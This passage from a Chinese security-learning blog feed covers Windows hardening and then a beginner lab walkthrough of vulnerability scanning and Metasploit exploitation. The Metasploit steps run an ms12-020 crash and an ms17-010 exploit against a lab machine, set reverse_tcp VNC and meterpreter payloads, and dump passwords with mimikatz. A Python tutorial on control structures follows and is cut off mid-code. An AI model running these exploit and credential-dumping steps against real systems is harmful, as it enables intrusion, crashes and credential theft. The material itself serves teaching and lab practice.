id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h4><p><strong>封禁135端口对外开放</strong></p><p>（1）运行gpedit.msc进入组策略配置(组策略:是针对用户upn或计算机上强制使用的配置方法，不是权限)</p><pre><code>PS:家庭版的Windows没有组策略，以管理员身份运行下载的脚本后，再用运行窗口即可打开gpedit.msc</code></pre><p>（2）依次点击进入计算机配置–&gt;Windows设置–&gt;安全设置–&gt;IP安全策略</p><p>（3）在空白处右键，创建IP安全策略</p><p>（4）进入IP安全策略设置向导</p><p>（5）设置IP安全策略名称</p><p>（6）去除”激活默认响应规则”</p><p>（7）点击完成， 并进入编辑属性</p><p>（8）去除”使用添加向导”复选框，点击”添加”进入IP筛选列表配置</p><p>（9）去除”使用添加向导”复选框，点击”添加”进入IP筛选器配置</p><p>（10）地址选项卡，源地址选择”任何地址”，目标地址选择”我的IP地址”，去掉”镜像”</p><p>（11）协议选项卡，协议类型选择”TCP”,设置从任意端口，到此端口填写135，点击”确定”，若需要添加屏蔽端口，可再次点击添加，无需添加则点击”确定”</p><p>（12）在筛选器操作选项卡，点击”添加”，添加一个新筛选器操作”阻止”</p><p>（13）选中新建的IP筛选列表和筛选器操作，点击”应用”</p><p>（14）右键新IP安全策略，点击”分配”，指派新建的IP安全策略</p><pre><code>运行--&gt;gpupdate /force    ##强制更新</code></pre><p>（15）在kali中使用nmap工具验证端口已被阻塞</p><pre><code>nmap -sS -p 135,139,445,3389 192.168.14.131</code></pre><h2 id="Windows系统配置加固"><a href="#Windows系统配置加固" class="headerlink" title="Windows系统配置加固"></a>Windows系统配置加固</h2><h4 id="账号口令"><a href="#账号口令" class="headerlink" title="账号口令"></a>账号口令</h4><p><strong>账号优化:目的是为了梳理系统中的账号以及口令，避免默认账号及弱口令的存在</strong></p><p>（1）查看账号方式：</p><pre><code>开始--&gt;运行--&gt;compmgmt.msc(进入计算机管理)/lusrmgr.msc--&gt;本地用户和组或者开始--&gt;运行--&gt;cmd--&gt;net user</code></pre><p><img src="https://i.loli.net/2020/12/10/KSJmdz6aosPxeNM.png" alt="image-20201210185315326"></p><p>（2）删除无用账号</p><pre><code>net user user_name /delPS:net user user_name$ passwd /add  增加一个账号，其中的添加美元符号即可在命令行中隐藏net user /?  获取提示</code></pre><p>（3）锁定无用账号，如锁定”Guest”账号</p><pre><code>net user Guest /active:no</code></pre><p>（4）禁用Guest账号：运行–&gt;lusrmgr.msc–&gt;用户–&gt;Guest–&gt;禁用</p><p><strong>口令策略：增强密码复杂度，防止用户长期使用同一个账号，以及账号锁定策略等，降低系统账号被暴力破解的可能性</strong></p><p>（1）配置方式：开始–&gt;运行–&gt;secpol.msc(本地安全策略)–&gt;安全设置</p><p>（2）账户策略–&gt;密码策略(建议加固值)</p><p>（3）账户策略–&gt;账户锁定策略(建议加固值)</p><p>（4）本地策略–&gt;安全选项：配置用户退出后再次登录不会显示上次退出的用户名</p><h4 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h4><p>（1）授权账号登录：目的是设置允许从本地或者远程登录的账号。</p><p>（2）配置操作：开始–&gt;运行–&gt;secpol.msc–&gt;安全设置–&gt;本地策略–&gt;用户权限分配</p><p>（3）要求系统账号无法远程登录：用户权限分配–&gt;拒绝通过远程桌面服务登录–&gt;添加用户和组，添加system和administrator。</p><p><img src="https://i.loli.net/2020/12/13/ipIALnbZvF1JOxB.png" alt="image-20201213111329893"></p><p><img src="https://i.loli.net/2020/12/13/SekzPwMoQpaC9AF.png" alt="image-20201213111112396"></p><p><img src="https://i.loli.net/2020/12/13/P459tnRrvLBY1FV.png" alt="image-20201213110908484"></p><p>拒绝从网络访问这台计算机–&gt;添加用户和组，添加system和administrator</p><p><img src="https://i.loli.net/2020/12/13/TEGv8lBVZSO1aoI.png" alt="image-20201213110947814"></p><p>（4）最后要强制生效组策略，运行窗口下执行</p><pre><code>gpupdate /force</code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>利用cmd将Windows物理机的文件传输到Windows虚拟机。</p><pre><code>net use \\192.168.14.131\ipc$ &quot;ndsec&quot; user:ndsec       ##其中ndsec为虚拟机的账户密码，192.168.14.131为虚拟机的IP地址</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统漏洞分析与验证</title>
      <link href="2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/"/>
      <url>2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="安全漏洞的基本概念"><a href="#安全漏洞的基本概念" class="headerlink" title="安全漏洞的基本概念"></a>安全漏洞的基本概念</h2><h3 id="漏洞的定义"><a href="#漏洞的定义" class="headerlink" title="漏洞的定义"></a>漏洞的定义</h3><p>（1）漏洞(Vulnerability)是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。简单说就是指一个系统存在的弱点或缺陷。</p><p>（2）1970-80年代，早期黑客的出现和第一个计算机病毒的产生，软件漏洞逐渐引起人们的注意。</p><p>（3）计算机病毒(Computer Virus)是编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。</p><h3 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h3><p>（1）实现漏洞：是安全漏洞中最大的一类。实现漏洞是由于在程序编码时不够严谨或对于安全性的考虑不周而产生的漏洞，缓冲区溢出类漏洞就是最典型的实现漏洞。</p><p>（2）设计漏洞：主要是指软件、硬件和固件在设计时对于安全性考虑不周而导致的漏洞。</p><p>例如F5 BIG-ip远程绕过验证漏洞是由于F5设备的SSH登录模块内置了一个可用于登录的密钥文件，这个密钥被泄露后任意获取该密钥的用户都可以登录一台相关版本的设备。</p><p>（3）配置漏洞：是由于软件的默认配置或者不恰当的配置导致的安全漏洞。</p><p>例如弱口令或默认口令就是一种常见的配置漏洞。</p><h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>（1)微软的RPC漏洞与蠕虫病毒</p><table><thead><tr><th align="center">时间</th><th align="center">漏洞</th><th align="center">危害</th></tr></thead><tbody><tr><td align="center">2003年</td><td align="center">RPC(远程过程调用协议)接口中的缓冲区溢出   冲击波蠕虫病毒</td><td align="center">席卷全球80%的计算机</td></tr><tr><td align="center">2008年</td><td align="center">MS08-067漏洞，基于445端口(共享打印机/文件)   Conficker(飞客蠕虫病毒)</td><td align="center">感染1500万台以上计算机</td></tr><tr><td align="center">2017年</td><td align="center">永恒之蓝(MS17-010)漏洞，基于445端口  Wannacry(勒索病毒)</td><td align="center">造成80亿美元以上经济损失</td></tr></tbody></table><p>（2）漏洞的危害：远程控制、信息泄露、拒绝服务、权限提升</p><h3 id="漏洞的信息组成"><a href="#漏洞的信息组成" class="headerlink" title="漏洞的信息组成"></a>漏洞的信息组成</h3><p>（1）漏洞名称</p><p>（2）发布日期</p><p>（3）漏洞编号</p><p>（4）风险等级</p><p>（5）影响范围</p><p>（6）漏洞描述</p><p>（7）解决方案</p><h3 id="漏洞信息管理"><a href="#漏洞信息管理" class="headerlink" title="漏洞信息管理"></a>漏洞信息管理</h3><p>（1）CVE(Common Vulnerabliities &amp; Exposures,通用漏洞披露)</p><p>（2）美国国家漏洞数据库(NVD)</p><p>（3）<a href="http://cve.mitre.org/">http://cve.mitre.org</a> CVE官网</p><p>（4）<a href="http://www.cnnvd.org.cn/index.htm">http://www.cnnvd.org.cn/index.html</a> 国家信息安全漏洞库</p><p>（5）<a href="http://www.nsfocus.net/">http://www.nsfocus.net/</a> 绿盟科技</p><p>（6）<a href="http://www.scap.org.cn/">http://www.scap.org.cn/</a> SCAP 安全内容自动化协议中文社区</p><p>（7）微软安全公告</p><h2 id="安全漏洞的检测技术"><a href="#安全漏洞的检测技术" class="headerlink" title="安全漏洞的检测技术"></a>安全漏洞的检测技术</h2><h3 id="漏洞检测技术"><a href="#漏洞检测技术" class="headerlink" title="漏洞检测技术"></a>漏洞检测技术</h3><p>寻找漏洞方法：</p><p>（1）静态分析：人为查看代码(分析代码)</p><p>（2）动态分析：使用工具nmap(端口)、nessus(服务、OS)、msf(扫描、验证)进行漏洞扫描</p><p>利用漏洞实时攻击：<br>（1）静态：人为写payload</p><p>（2）动态：工具msf</p><h3 id="常见的系统漏洞扫描器"><a href="#常见的系统漏洞扫描器" class="headerlink" title="常见的系统漏洞扫描器"></a>常见的系统漏洞扫描器</h3><p>（1）系统漏洞扫描器是相对于WEB应用漏洞扫描器而言的，主要是针对操作系统和各类通用性较强的软件应用进行漏洞检测的工具。</p><p>（2）软件类：NESSUS、OpenVAS、Nmap</p><p>（3）硬件类：绿盟科技远程安全评估系统、网御漏洞扫描系统、榕基风险管理系统、杭州迪普漏洞扫描系统、启明天镜脆弱性扫描与管理系统</p><h3 id="系统漏洞扫描的基本流程"><a href="#系统漏洞扫描的基本流程" class="headerlink" title="系统漏洞扫描的基本流程"></a>系统漏洞扫描的基本流程</h3><p>存活判断–&gt;端口扫描–&gt;服务识别–&gt;系统识别–&gt;弱口令/登录扫描–&gt;漏洞映射</p><h3 id="漏洞识别原理"><a href="#漏洞识别原理" class="headerlink" title="漏洞识别原理"></a>漏洞识别原理</h3><p>漏洞识别的主要方法可以分为原理扫描和推断扫描两类，在实际实现的过程中，扫描器开发者会根据漏洞的特点不同而选择不同的漏洞识别技术，进行漏洞识别。</p><table><thead><tr><th align="center">识别技术</th><th align="center">检测思路</th><th align="center">准确率</th><th align="center">检测效率</th><th align="center">对目标的影响</th><th align="center">适用场景</th></tr></thead><tbody><tr><td align="center">原理扫描</td><td align="center">利用漏洞形成的原因和漏洞的特点尝试对漏洞进行利用，并根据漏洞利用的结果来判断漏洞是否存在</td><td align="center">高</td><td align="center">步骤多，检测速度慢</td><td align="center">对目标影响较大，可能导致目标宕机或破坏程序和数据</td><td align="center">常用于WEB应用漏洞扫描和一些利用后不影响系统运行的漏洞，尤其不适用于拒绝服务漏洞。</td></tr><tr><td align="center">推断扫描</td><td align="center">推断扫描不直接利用漏洞，而是寻找其他漏洞存在的证据，并以此推断漏洞存在。版本检查是推断扫描的常用方式之一</td><td align="center">受实现技术和漏洞修复技术的影响，有一定的误报率</td><td align="center">过程简单，速度较快</td><td align="center">不利用漏洞，对目标影响较小</td><td align="center">适用于通用软件的扫描，在大规模的扫描任务中有比较明显的优势。</td></tr></tbody></table><h3 id="利用Nmap扫描漏洞"><a href="#利用Nmap扫描漏洞" class="headerlink" title="利用Nmap扫描漏洞"></a>利用Nmap扫描漏洞</h3><p>（1）常见的Nmap脚本扫描，命令格式如下：</p><pre><code>nmap --script=&lt;类别参数&gt;##常用的脚本扫描参数：vuln:负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067</code></pre><p>（2）例子：</p><pre><code>ifconfig           //先查看本机所在网段nmap --sP 192.168.14.0/24     //扫描本网段中存活的主机nmap --script=vuln 192.168.14.131    //扫描靶机是否有常见的漏洞</code></pre><p><img src="https://i.loli.net/2020/12/06/mDLr54RPzpfkiI6.png" alt="image-20201206140811838"></p><p><img src="https://i.loli.net/2020/12/06/osvrzTiFplNQ82E.png"></p><h2 id="Nessus介绍与漏洞扫描"><a href="#Nessus介绍与漏洞扫描" class="headerlink" title="Nessus介绍与漏洞扫描"></a>Nessus介绍与漏洞扫描</h2><h3 id="NESSUS简介"><a href="#NESSUS简介" class="headerlink" title="NESSUS简介"></a>NESSUS简介</h3><p>目前最多人使用的<strong>系统漏洞扫描与分析软件</strong>,具有能够提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。可同时在本机或远端上遥控，进行系统的漏洞分析扫描，运作效能随着系统的资源而自行调整。可自行定义插件(Plug-in)等特性。</p><h3 id="NESSUS的功能介绍"><a href="#NESSUS的功能介绍" class="headerlink" title="NESSUS的功能介绍"></a>NESSUS的功能介绍</h3><p>（1）打开浏览器输入<a href="https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)">https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)</a></p><p>（2）在首页选择new scans 或者 Creat a new scan新建一个扫描任务，新建任务时需要对扫描进行选择或者配置，带有upgrade标签的是需要升级成企业版或者专业版才能使用，这里选择免费的“Basic Network Scan进行配置。</p><p><img src="https://i.loli.net/2020/12/06/AdDqFb3GT81k6f7.png" alt="image-20201206142030678"></p><p><img src="https://i.loli.net/2020/12/06/m71ce3RjDa9odwA.png" alt="image-20201206142222469"></p><p>（3）通常情况下，只对General(一般选项)、Discovery(主机发现)、Assessment(风险评估)、及Advanced(高级选项)进行配置。</p><p><img src="https://i.loli.net/2020/12/06/fCsbW2ah5jeyw4B.png" alt="image-20201206142758916"></p><h3 id="常见漏洞扫描器的使用方法"><a href="#常见漏洞扫描器的使用方法" class="headerlink" title="常见漏洞扫描器的使用方法"></a>常见漏洞扫描器的使用方法</h3><p>选择任务类型–&gt;填写扫描目标–&gt;选择扫描模板/插件–&gt;高级选项(可默认)–&gt;扫描报告选项–&gt;开始扫描</p><h3 id="NESSUS的使用"><a href="#NESSUS的使用" class="headerlink" title="NESSUS的使用"></a>NESSUS的使用</h3><p>（1）设置项目名称、归属栏目为my scans，输入目标主机IP或网段</p><p><img src="https://i.loli.net/2020/12/06/PJ5tnvolMpHh8Aa.png" alt="image-20201206153948858"></p><p>（2）点击Launch开始扫描，可在首页查看扫描记录，点击对应的扫描任务可查看任务的详细信息，可导出</p><p><img src="https://i.loli.net/2020/12/06/hygtJVelpXWNBFm.png" alt="image-20201206144435278"></p><p><img src="https://i.loli.net/2020/12/06/MFipyxdWQketaKr.png" alt="image-20201206145449869"></p><p>（3）选择扫描任务进入后可查看扫描信息</p><p><img src="https://i.loli.net/2020/12/06/cKR5VoZiCFrJhAz.png" alt="image-20201206145610763"></p><p>（4）点击要查看的漏洞，可获取该漏洞的介绍、漏洞对应的解决方案、生成原因、涉及到的端口和主机信息，可导出。</p><p><img src="https://i.loli.net/2020/12/06/sd3Nc12RA8PX6TG.png" alt="image-20201206150013091"></p><h3 id="NESSUS的报告解读"><a href="#NESSUS的报告解读" class="headerlink" title="NESSUS的报告解读"></a>NESSUS的报告解读</h3><p>漏洞风险等级、漏洞描述、漏洞涉及服务端口</p><h2 id="Metasploit-msf-介绍与漏洞利用"><a href="#Metasploit-msf-介绍与漏洞利用" class="headerlink" title="Metasploit(msf)介绍与漏洞利用"></a>Metasploit(msf)介绍与漏洞利用</h2><p>Metasploit就是一个漏洞利用框架，简称MSF。作为全球最受欢迎的工具，不仅仅因为它的方便和强大，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p><h3 id="Metasploit常用的命令"><a href="#Metasploit常用的命令" class="headerlink" title="Metasploit常用的命令"></a>Metasploit常用的命令</h3><p>（1）show exploits   显示可用的渗透攻击模块</p><p>（2）search               用来搜寻一些渗透攻击模块，可以进行模糊匹配</p><p>（3）use                    使用某个渗透攻击模块，可以通过use命令来使用show或search出来的渗透模块</p><p>（4）show options  显示参数当选择渗透模块后，使用show options会显示该模块所需设置的参数，熟练后可不用</p><p>（5）set                    用来设置某些选项，比如使用set命令设置攻击模块的options参数；设置攻击载荷payloads</p><p>（6）exploit             设置完所有参数时，使用exploit命令，开始进行攻击，也可用run</p><h3 id="Metasploit攻击流程与思路"><a href="#Metasploit攻击流程与思路" class="headerlink" title="Metasploit攻击流程与思路"></a>Metasploit攻击流程与思路</h3><p>搜索攻击模块–&gt;利用攻击模块–&gt;查看与配置选项–&gt;进行攻击</p><p>（1）搜寻攻击模块：search + 漏洞信息或编号</p><p>（2）使用某个模块：use</p><p>（3）查看配置选项：show options</p><p>（4）设置选项值：set</p><p>（5）开始攻击：exploit/run</p><h3 id="ms12-020漏洞利用"><a href="#ms12-020漏洞利用" class="headerlink" title="ms12-020漏洞利用"></a>ms12-020漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p><p><img src="https://i.loli.net/2020/12/06/Uv5pFWO3dfyA9x2.png" alt="image-20201206161452095"></p><p>（2）搜索ms12-020漏洞利用模块</p><pre><code>search ms12-020auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></pre><p><img src="https://i.loli.net/2020/12/06/Qx1cHIsEkjU4hCv.png" alt="image-20201206161732437"></p><p>（3）使用模块use+模块名,可用table键补全，也可以use+模块前的编号(如0,1,2….)</p><p><img src="https://i.loli.net/2020/12/06/3qy5Cd9RaYbInSm.png" alt="image-20201206161936099"></p><p>（4）查看当前模块所需配置项show options，有”yes”的地方需要配置参数，其中RHOST需设置为远程靶机的IP地址</p><p><img src="https://i.loli.net/2020/12/06/Hy6SwYbgshczuTV.png" alt="image-20201206162138879"></p><p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p><pre><code>set RHOST 192.168.14.131      //192.168.14.131为靶机的IP</code></pre><p><img src="https://i.loli.net/2020/12/06/qSI5pXsAk6TDtrW.png" alt="image-20201206162349469"></p><p>（6）实施攻击exploit或run，可发现靶机蓝屏</p><p><img src="https://i.loli.net/2020/12/06/4kCD1JwWvxX7Bhd.png" alt="image-20201206162544164"></p><p><img src="https://i.loli.net/2020/12/06/ELmSMNu4rqGJTsO.png" alt="image-20201206162959336"></p><h3 id="ms17-010漏洞利用"><a href="#ms17-010漏洞利用" class="headerlink" title="ms17-010漏洞利用"></a>ms17-010漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p><p>（2）搜索ms17-010漏洞利用模块</p><p>（3）使用模块use+模块名，不同的攻击模块效果不同，这里使用第三个攻击模块</p><p><img src="https://i.loli.net/2020/12/06/5qv39wEAKTyGPox.png" alt="image-20201206163607554"></p><p>（4）show options</p><p><img src="https://i.loli.net/2020/12/06/Adl2F3oyBrD86sI.png" alt="image-20201206163718981"></p><p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p><pre><code>set RHOST 192.168.14.131       //192.168.14.131为靶机的IP</code></pre><p>（6）开始攻击exploit/run，可发现获取了靶机的shell界面，Ctrl+C退出该shell界面</p><p><img src="https://i.loli.net/2020/12/06/hPi6Of7QCVS2Lnw.png" alt="image-20201206164237163"></p><p>（7）但是存在乱码，解决方法：”终端”–&gt;”设定字符编码”–&gt;”简体中文—GB2312”</p><p><img src="https://i.loli.net/2020/12/06/39vQqjzUVWZ2wgM.png" alt="image-20201206164518356"></p><p><img src="https://i.loli.net/2020/12/06/HgTtuQGAfwh2m8b.png" alt="image-20201206164717015"></p><p>（8）利用获取的shell界面，在靶机桌面创建一个1.txt文档。</p><pre><code>cd /users/ndsec/Desktopedit 1.txt</code></pre><p>（9）利用ms17-010漏洞进行实时监控靶机</p><pre><code>set payload windows/x64/vncinject/reverse_tcp</code></pre><p><img src="https://i.loli.net/2020/12/06/zUqP5EeRxMYHwod.png" alt="image-20201206165435030"></p><p>（10）利用ms17-010漏洞获取靶机密码</p><pre><code>set payload windows/x64/meterpreter/reverse_tcpexploit/runload mimikatz        //加载模块获取密码msv                  //利用mimikatz的msv获取密文hashkerberos             //获取明文密码</code></pre><p><img src="https://i.loli.net/2020/12/06/kaUPCm1t3sovcnL.png" alt="image-20201206171203722"></p><p><img src="https://i.loli.net/2020/12/06/o6sd89qRGHfbme3.png" alt="image-20201206172505028"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(三)-程序的控制结构01</title>
      <link href="2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/"/>
      <url>2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/</url>
      
        <content type="html"><![CDATA[<h2 id="程序的基本结构"><a href="#程序的基本结构" class="headerlink" title="程序的基本结构"></a>程序的基本结构</h2><p>要点：程序由3种基本结构组成：顺序结构、分支结构和循环结构</p><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>（1）顺序结构：程序按照线性顺序依次执行的一种运行方式</p><p>（2）分支结构：程序根据条件判断结果而选择不同向前执行路径的一种运行方式。包括单分支结构和二分支结构，二分支结构组合形成多分支结构。</p><p>（3）循环结构：程序根据条件判断结果向后反复执行的一种运行方式。根据循环体触发条件不同，循环结构包括条件循环和遍历循环。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>（1）圆面积和周长的计算</p><pre><code class="python">R = eval(input(&quot;请输入圆半径：&quot;))S = 3.1415*R*RL = 2*3.1415*Rprint(&quot;面积和周长&quot;,S,L)</code></pre><p>（2）实数绝对值的计算</p><pre><code class="python">R = eval(input(&quot;输入实数：&quot;))if (R &lt; 0):    R = -Rprint(&quot;绝对值为&quot;,R)</code></pre><p>（3）正整数累加</p><pre><code class="python">R = eval(input(&quot;请输入整数：&quot;))i,sum = 0, 0while(i&lt;=R):    sum += i    i +=1print(&quot;累加求和&quot;,sum)</code></pre><h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><h3 id="单分支结构-if语句"><a href="#单分支结构-if语句" class="headerlink" title="单分支结构:if语句"></a>单分支结构:if语句</h3><p>（1）Python中if语句的语法格式如下：</p><pre><code class="python">if &lt;条件&gt;:    &lt;语句块&gt;</code></pre><p>（2）形成条件判断最常见的方式是采用关系操作符。Python共有6个关系操作符。</p><table><thead><tr><th align="center">操作符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&lt;=</td><td align="center">小于或等于</td></tr><tr><td align="center">&gt;=</td><td align="center">大于或等于</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">==</td><td align="center">等于</td></tr><tr><td align="center">!=</td><td align="center">不等于</td></tr></tbody></table><p><strong>Python使用”=”表示赋值语句，使用”==”表示等于</strong></p><p>（3）实例：PM2.5空气质量提醒(1)</p><pre><code class="python">PM = eval(input(&quot;请输入PM2.5值：&quot;))if 0 &lt;= PM &lt; 35:    print(&quot;空气质量优，快去户外活动!&quot;)if 35 &lt;= PM &lt;75:    print(&quot;空气质量良好，适度户外活动!&quot;)if 75 &lt;= PM:    print(&quot;空气污染，请小心!&quot;)</code></pre><p>（4）上述代码使用数字进行比较，而字符或字符串也可以用于条件比较。字符串比较本质上是字符串对应Unicode编码的比较。因此，字符串的比较按照字典顺序进行。例如英文大写字符对应的Unicode编码比小写字符小。</p><pre><code class="python">&gt;&gt;&gt; &quot;Python&quot; &gt; &quot;python&quot;False</code></pre><h3 id="二分支结构-if-else语句"><a href="#二分支结构-if-else语句" class="headerlink" title="二分支结构:if-else语句"></a>二分支结构:if-else语句</h3><p>（1）Python语句中if-else语句用来形成二分支结构，语法格式如下：</p><pre><code class="python">if &lt;条件&gt;:    &lt;语句块1&gt;else:    &lt;语句块2&gt;</code></pre><p>（2）语句块1是在if条件满足后执行的一个或多个语句序列，语句块2是if条件不满足后执行的语句序列。</p><p>（3）实例：PM2.5空气质量提醒(2)</p><pre><code class="python">PM = eval(input(&quot;请输入PM2.5数值：&quot;))if PM &gt;=75:    print(&quot;空气存在污染，请小心!&quot;)else:    print(&quot;空气没有污染，可以开展户外活动!&quot;)</code></pre><p>（4）二分支结构还有一种更为简洁的表达方式，适合通过判断返回特定值，语法格式如下：</p><pre><code class="python">&lt;表达式1&gt; if &lt;条件&gt; else &lt;表达式2&gt;</code></pre><p>上述实例可改造为：</p><pre><code class="Python">PM = eval(input(&quot;请输入PM2.5数值：&quot;))print(&quot;空气&#123;&#125;污染!&quot;.format(&quot;存在&quot; if PM &gt;= 75 else &quot;没有&quot;))</code></pre><p>（5）其他适合对特殊值处理的情况：</p><pre><code class="python">&gt;&gt;&gt; count = 2&gt;&gt;&gt; count if count!=0 else &quot;不存在&quot;2&gt;&gt;&gt; count = 0&gt;&gt;&gt; count if count!=0 else &quot;不存在&quot;&#39;不存在&#39;</code></pre><h3 id="多分支结构：if-elif-else语句"><a href="#多分支结构：if-elif-else语句" class="headerlink" title="多分支结构：if-elif-else语句"></a>多分支结构：if-elif-else语句</h3><p>（1）Python的if-elif-else描述多分支结构，语句格式如下：</p><pre><code class="python">if &lt;条件1&gt;:    &lt;语句块1&gt;elif &lt;条件2&gt;:    &lt;语句块2&gt;...else:    &lt;语句块N&gt;</code></pre><p>（2）多分支结构是二分支结构的扩展，通常用于设置同一个条件的多条执行路径。Python依次评估寻找第一个结果为True的条件，执行该条件下的语句块，然后跳过整个if-elif-else结构，执行后面的语句。</p><p>（3）实例：</p><pre><code class="python">PM = eval(input(&quot;请输入PM2.5值：&quot;))if 0 &lt;= PM &lt; 35:    print(&quot;空气质量优，快去户外活动!&quot;)elif 35 &lt;= PM &lt;75:    print(&quot;空气质量良好，适度户外活动!&quot;)else:    print(&quot;空气污染，请小心!&quot;)</code></pre><h2 id="实例5-身体质量指数BMI"><a href="#实例5-身体质量指数BMI" class="headerlink" title="实例5:身体质量指数BMI"></a>实例5:身体质量指数BMI</h2><p>（1）BMI定义:BMI值等于体重(kg)除以身高(m)的平方。</p><p>（2）指标分类：</p><table><thead><tr><th align="center">分类</th><th align="center">国际BMI值</th><th align="center">国内BMI值</th></tr></thead><tbody><tr><td align="center">偏瘦</td><td align="center">&lt;18.5</td><td align="center">&lt;18.5</td></tr><tr><td align="center">正常</td><td align="center">18.5~25</td><td align="center">18.5~24</td></tr><tr><td align="center">偏胖</td><td align="center">25~30</td><td align="center">24~28</td></tr><tr><td align="center">肥胖</td><td align="center">&gt;=30</td><td align="center">&gt;=28</td></tr></tbody></table><p>（3）</p><pre><code class="python">height, weight = eval(input(&quot;请输入身高(米)和体重\      #采用反斜杠(\)将很长的一行分解两行书写(公斤)[逗号隔开]:&quot;))bmi = weight / pow(height,2)print(&quot;BMI数值为：&#123;:.2f&#125;&quot;.format(bmi))who, dom = &quot;&quot;,&quot;&quot;if bmi &lt; 18.5:      #WHO标准    who = &quot;偏瘦&quot;elif bmi &lt; 25:    who = &quot;正常&quot;elif bmi &lt;30:    who = &quot;偏胖&quot;else:    who = &quot;肥胖&quot;if bmi &lt; 18.5:      #我国卫生部标准    dom = &quot;偏瘦&quot;elif bmi &lt; 24:    dom = &quot;正常&quot;elif bmi &lt; 28:    dom = &quot;偏胖&quot;else:    dom = &quot;肥胖&quot;print(&quot;BMI指标为：国际&#39;&#123;0&#125;&#39;,国内&#39;&#123;1&#125;&#39;&quot;.format(who, dom))</code></pre><h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><p><strong>要点：Python通过for、while等保留字提供遍历循环和无限循环的结构</strong></p><p>（1）根据循环的确定次数，可分为确定次数循环和非确定次数循环。</p><p>（2）确定次数循环在Python中被称为“遍历循环”，具体采用for语句实现。</p><p>（3）非确定次数循环程序不确定循环体可能的执行次数，而通过条件判断是否继续执行循环体，称为无限循环，又叫条件循环，采用while语句实现。</p><h3 id="遍历循环：for语句"><a href="#遍历循环：for语句" class="headerlink" title="遍历循环：for语句"></a>遍历循环：for语句</h3><p>（1）Python通过保留字for实现“遍历循环”，基本使用方法如下：</p><pre><code>for &lt;循环变量&gt; in &lt;遍历结构&gt;:    &lt;语句块&gt;</code></pre><p>（2）遍历结构可以是字符串、文件、组合数据类型或range()函数等，常用的使用方法如下：</p><pre><code class="Python">#循环n次for i in range(n):    &lt;语句块&gt;#遍历文件file的每一行for line in file:    &lt;语句块&gt;#遍历字符串sfor c in s:    &lt;语句块&gt;#遍历列表lsfor item in ls:    &lt;语句块&gt;</code></pre><p>（3）遍历循环的一种扩展模式，使用方法如下：</p><pre><code class="python">for &lt;循环结构&gt; in &lt;遍历结构&gt;:    &lt;语句块1&gt;else:    &lt;语句块2&gt;</code></pre><p>在扩展模式中，else语句只在循环正常执行并结束后才执行。因此，可以在&lt;语句块2&gt;中放置判断循环执行情况的语句。</p><pre><code class="python">for s in &quot;BIT&quot;:    print(&quot;循环进行中：&quot;+s)else:    s = &quot;循环正常结束&quot;print(s)</code></pre><p>执行结果：</p><pre><code class="python">循环进行中：B循环进行中：I循环进行中：T循环正常结束&gt;&gt;&gt; </code></pre><h3 id="无限循环：while语句"><a href="#无限循环：while语句" class="headerlink" title="无限循环：while语句"></a>无限循环：while语句</h3><p>（1）Python通过保留字while实现无限循环，基本使用方法如下：</p><pre><code class="Python">while &lt;条件&gt;：    &lt;语句块&gt;</code></pre><p>其中条件与if语句中的判断条件一样，结果为True和False。</p><p>（2）无限循环：使用保留字else的扩展模式，使用方法如下：</p><pre><code class="python">while &lt;条件&gt;:    &lt;语句块1&gt;else：    